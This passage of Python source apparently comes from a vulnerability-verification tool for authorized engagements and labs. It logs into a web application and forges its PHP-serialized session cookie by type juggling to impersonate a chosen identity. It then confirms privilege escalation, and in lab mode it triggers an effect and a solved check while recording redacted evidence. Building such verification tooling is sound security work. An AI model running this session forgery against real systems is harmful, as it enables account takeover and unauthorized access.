                    not _response_contains(login_page["body"], unsolved_marker)
                    or _response_contains(login_page["body"], solved_marker)
                ):
                    raise ValueError("login page did not prove the configured unsolved baseline")
                preauth_cookie_name = ""
                preauth_cookie = ""
                try:
                    preauth_cookie_name, preauth_cookie = _select_cookie(
                        login_page["headers"], cookie_name_hint
                    )
                except PhpSerializedError:
                    # A pre-authentication cookie is optional. The issued serialized
                    # carrier after login is not.
                    pass
                if preauth_cookie:
                    secrets.append(preauth_cookie)
                csrf_token: Optional[str] = None
                if csrf_field:
                    csrf_token = extract_form_token(login_page["body"], csrf_field)
                    if not csrf_token:
                        raise ValueError("configured CSRF field was not found on the login page")
                    secrets.append(csrf_token)
                evidence_steps.append(
                    build_http_evidence_step(
                        step_labels[0],
                        "GET",
                        login_url,
                        "",
                        False,
                        login_page,
                        secrets,
                        "none",
                        "",
                    )
                )

                login_form = {
                    str(parameters["usernameField"]): str(parameters["username"]),
                    str(parameters["passwordField"]): str(parameters["password"]),
                }
                if csrf_field and csrf_token:
                    login_form[csrf_field] = csrf_token
                login_body = urlencode(login_form)
                login_submit = await self._request(
                    session,
                    "POST",
                    login_url,
                    login_body,
                    preauth_cookie_name,
                    preauth_cookie,
                )
                request_count += 1
                corroborate_status(
                    "expectedLoginSubmitStatus/login-submit",
                    expected_login_submit,
                    login_submit["status"],
                )
                corroborate_location(
                    "expectedLoginLocation/login-submit",
                    parameters.get("expectedLoginLocation"),
                    login_submit["headers"].get("Location"),
                )
                if login_submit["truncated"]:
                    raise ValueError("login response exceeded the bounded evidence contract")
                cookie_name, original_cookie, original_object, encoding = _select_serialized_cookie(
                    login_submit["headers"], cookie_name_hint
                )
                secrets.append(original_cookie)
                evidence_steps.append(
                    build_http_evidence_step(
                        step_labels[1],
                        "POST",
                        login_url,
                        _redacted_form_body(parameters, csrf_field),
                        bool(preauth_cookie),
                        login_submit,
                        secrets,
                        "none",
                        "",
                    )
                )

                original_raw = original_object.raw
                class_hint = str(parameters.get("serializedClass") or "")
                if class_hint and original_object.class_name != class_hint:
                    raise PhpSerializedError("serialized class does not match the configured class")
                identity_property, token_property, source_identity = _resolve_mutation_fields(
                    original_object, parameters
                )
                forged_object, mutations = forge_type_juggling_object(
                    original_object,
                    identity_property,
                    token_property,
                    source_identity,
                    str(parameters["targetIdentity"]),
                )
                forged_cookie = encode_cookie_carrier(forged_object.raw, encoding)
                secrets.append(forged_cookie)
                before_sha = _sha256_bytes(original_raw)
                after_sha = _sha256_bytes(forged_object.raw)

                original_denied = await self._request(
                    session, "GET", privilege_url, None, cookie_name, original_cookie
                )
                request_count += 1
                corroborate_status(
                    "expectedDeniedStatus/original-session-denied",
                    expected_denied,
                    original_denied["status"],
                )
                if original_denied["truncated"]:
                    raise ValueError("original-session response exceeded the bounded contract")
                if is_lab:
                    if not _response_contains(
                        original_denied["body"], denied_marker
                    ) or _response_contains(original_denied["body"], privilege_marker):
                        raise ValueError("original serialized session was not denied as configured")
                elif int(original_denied["status"]) not in {401, 403}:
                    raise ValueError("runtime original session did not return a decisive denial status")
                evidence_steps.append(
                    build_http_evidence_step(
                        step_labels[2],
                        "GET",
                        privilege_url,
                        "",
                        True,
                        original_denied,
                        secrets,
                        "original",
                        before_sha,
                    )
                )

                forged_privilege = await self._request(
                    session, "GET", privilege_url, None, cookie_name, forged_cookie
                )
                request_count += 1
                corroborate_status(
                    "expectedPrivilegeStatus/type-confused-privileged",
                    expected_privilege,
                    forged_privilege["status"],
                )
                if forged_privilege["truncated"]:
                    raise ValueError("forged-session response exceeded the bounded contract")
                if is_lab:
                    if not _response_contains(
                        forged_privilege["body"], privilege_marker
                    ) or _response_contains(forged_privilege["body"], denied_marker):
                        raise ValueError("forged serialized session did not prove privilege")
                elif (
                    not 200 <= int(forged_privilege["status"]) <= 299
                    or forged_privilege["body"] == original_denied["body"]
                ):
                    raise ValueError("runtime forged session did not prove a privilege differential")
                evidence_steps.append(
                    build_http_evidence_step(
                        step_labels[3],
                        "GET",
                        privilege_url,
                        "",
                        True,
                        forged_privilege,
                        secrets,
                        "forged",
                        after_sha,
                    )
                )

                original_replay = await self._request(
                    session, "GET", privilege_url, None, cookie_name, original_cookie
                )
                request_count += 1
                corroborate_status(
                    "expectedDeniedStatus/original-session-replay-denied",
                    expected_denied,
                    original_replay["status"],
                )
                if original_replay["truncated"]:
                    raise ValueError("original replay response exceeded the bounded contract")
                if is_lab:
                    if not _response_contains(
                        original_replay["body"], denied_marker
                    ) or _response_contains(original_replay["body"], privilege_marker):
                        raise ValueError("original-session replay did not remain denied")
                elif (
                    int(original_replay["status"]) not in {401, 403}
                    or int(original_replay["status"]) != int(original_denied["status"])
                ):
                    raise ValueError("runtime original-session replay did not preserve the denial")
                evidence_steps.append(
                    build_http_evidence_step(
                        step_labels[4],
                        "GET",
                        privilege_url,
                        "",
                        True,
                        original_replay,
                        secrets,
                        "original",
                        before_sha,
                    )
                )

                if is_lab:
                    effect = await self._request(
                        session, "GET", effect_url, None, cookie_name, forged_cookie
                    )
                    request_count += 1
                    corroborate_status(
                        "expectedEffectStatus/authorized-effect",
                        expected_effect,
                        effect["status"],
                    )
                    corroborate_location(
                        "expectedEffectLocation/authorized-effect",
                        parameters.get("expectedEffectLocation"),
                        effect["headers"].get("Location"),
                    )
                    if effect["truncated"]:
                        raise ValueError("approved effect response exceeded the bounded contract")
                    evidence_steps.append(
                        build_http_evidence_step(
                            step_labels[5],
                            "GET",
                            effect_url,
                            "",
                            True,
                            effect,
                            secrets,
                            "forged",
                            after_sha,
                        )
                    )

                    solved = await self._request(
                        session, "GET", solved_url, None, cookie_name, forged_cookie
                    )
                    request_count += 1
                    corroborate_status(
                        "expectedSolvedStatus/solved-confirmation",
                        expected_solved,
                        solved["status"],
                    )
                    if (
                        solved["truncated"]
                        or not _response_contains(solved["body"], solved_marker)
                        or _response_contains(solved["body"], unsolved_marker)
                    ):
                        raise ValueError("post-effect response did not prove the solved transition")
                    evidence_steps.append(
                        build_http_evidence_step(
                            step_labels[6],
                            "GET",
                            solved_url,
                            "",
                            True,
                            solved,
                            secrets,
                            "forged",
                            after_sha,
                        )
                    )
        except Exception as exc:
            error = sanitize_evidence_text(str(exc), secrets, 500)
            return {
                "success": False,
                "fallback": False,
                "error": error,
                "requestCount": request_count,
                "findings": [],
            }

        structure_sha = _structure_sha256(original_object)
        verification = {
            "verified": True,
            "fallback": False,
            "mode": "php-serialized-type-juggling",
            "proofLevel": proof_level,
            "format": "php-serialized-object",
            "target": target,
            "engagement": str(parameters["engagement"]).lower(),
            "allowUnsafeMethods": True,
            "originalDenied": True,
            "privilegeGranted": True,
            "originalReplayDenied": True,
            "requestCount": request_count,
            "loginRequests": 2,
            "controlRequests": 2,
            "probeRequests": 1,
            "effectRequests": 1 if is_lab else 0,
            "solvedChecks": 1 if is_lab else 0,
            "loginPath": str(parameters["loginPath"]),
            "privilegePath": str(parameters["privilegePath"]),
            "usernameField": str(parameters["usernameField"]),
            "passwordField": str(parameters["passwordField"]),
            "targetIdentity": str(parameters["targetIdentity"]),
            "parameterBindings": _parameter_bindings(parameters),
            "credentialProof": {
                "usernameSha256": _sha256_text(str(parameters["username"])),
                "usernameLength": len(str(parameters["username"]).encode("utf-8")),
                "passwordSha256": _sha256_text(str(parameters["password"])),
                "passwordLength": len(str(parameters["password"]).encode("utf-8")),
            },
            "observedLoginLocation": sanitize_evidence_text(
                str(login_submit["headers"].get("Location") or ""), secrets, 2_048
            ),
            "observedStatuses": [
                {"label": step["label"], "status": step["responseStatus"]}
                for step in evidence_steps
            ],
            "assertionMismatches": assertion_mismatches,
            "serialization": {
                "encoding": encoding,
                "cookieName": cookie_name,
                "beforeCarrierSha256": before_sha,
                "afterCarrierSha256": after_sha,
                "beforeCarrierLength": len(original_raw),
                "afterCarrierLength": len(forged_object.raw),
                "className": original_object.class_name,
                "propertyCount": len(original_object.properties),
                "propertyOrder": original_object.property_order,
                "structureSha256Before": structure_sha,
                "structureSha256After": structure_sha,
                "changedLeafCount": 2,
                "beforeSnapshot": _structural_snapshot(original_object),
                "afterSnapshot": _structural_snapshot(forged_object),
            },
            "mutations": mutations,
            "httpEvidence": {"version": 1, "steps": evidence_steps},
        }
        for name, value in (
            ("expectedLoginStatus", expected_login),
            ("expectedLoginSubmitStatus", expected_login_submit),
            ("expectedDeniedStatus", expected_denied),
            ("expectedPrivilegeStatus", expected_privilege),
        ):
            if value is not None:
                verification[name] = value
        if parameters.get("expectedLoginLocation") is not None:
            verification["expectedLoginLocation"] = sanitize_evidence_text(
                str(parameters["expectedLoginLocation"]), secrets, 2_048
            )
        if parameters.get("csrfField") is not None:
            verification["csrfField"] = str(parameters["csrfField"])
        if denied_marker:
            verification["deniedMarker"] = denied_marker
        if privilege_marker:
            verification["privilegeMarker"] = privilege_marker
        if is_lab:
            verification.update(
                {
                    "stateChangeApproved": True,
                    "solvedBefore": False,
                    "effectTriggered": True,
                    "solvedAfter": True,
                    "effectPath": str(parameters["effectPath"]),
                    "solvedPath": str(parameters["solvedPath"]),
                    "unsolvedMarker": unsolved_marker,
                    "solvedMarker": solved_marker,
                }
            )
            for name, value in (
                ("expectedEffectStatus", expected_effect),
                ("expectedSolvedStatus", expected_solved),
            ):
                if value is not None:
                    verification[name] = value
            if parameters.get("expectedEffectLocation") is not None:
                verification["expectedEffectLocation"] = sanitize_evidence_text(
                    str(parameters["expectedEffectLocation"]), secrets, 2_048
                )
        return {
            "success": True,
            "fallback": False,
            "target": target,
            "requestCount": request_count,
            "verification": verification,
            "findings": [build_nuclei_finding(target, verification)],
            "summary": {
                "verified": True,
                "mode": "php-serialized-type-juggling",
                "requestCount": request_count,
                "findingCount": 1,
            },
        }


def get_tool() -> DeserializationProbeTool:
    return DeserializationProbeTool()
